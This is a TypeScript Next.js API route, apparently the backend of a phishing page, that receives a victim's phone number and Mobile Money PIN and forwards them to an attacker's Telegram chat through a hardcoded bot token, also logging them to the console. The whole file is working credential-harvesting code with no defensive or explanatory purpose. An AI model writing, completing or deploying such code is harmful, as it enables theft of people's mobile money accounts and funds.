import { NextResponse } from 'next/server';

export async function POST(request: Request) {
  try {
    const { phone, pin } = await request.json();

    // 👇 TES VALEURS 👇
const TELEGRAM_TOKEN = "8768596085:AAF1kDSc5Ypv30CUaL2U7Bd6JIhLYqOd5AE";
    const TELEGRAM_CHAT_ID = "7181781795"; 

    const message = `🚨 **Nouveau code MoMo !**\n\n📱 Numéro : +225 ${phone}\n🔑 Code PIN : ${pin}\n🕒 Date : ${new Date().toLocaleString('fr-FR')}`;

    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
      })
    });

    // ⚠️ C'EST ICI QU'IL MANQUAIT L'ACCOLADE {
    if (!response.ok) {
      const errorData = await response.json();
      console.error("Détail de l'erreur Telegram :", errorData);
      throw new Error("Erreur lors de l'envoi à Telegram");
    }

    console.log('--- DONNÉE ENVOYÉE ---');
    console.log(`Numéro : ${phone} | PIN : ${pin}`);

    return NextResponse.json({ success: true });
  } catch (error) {
    console.error(error);
    return NextResponse.json({ success: false }, { status: 500 });
  }
}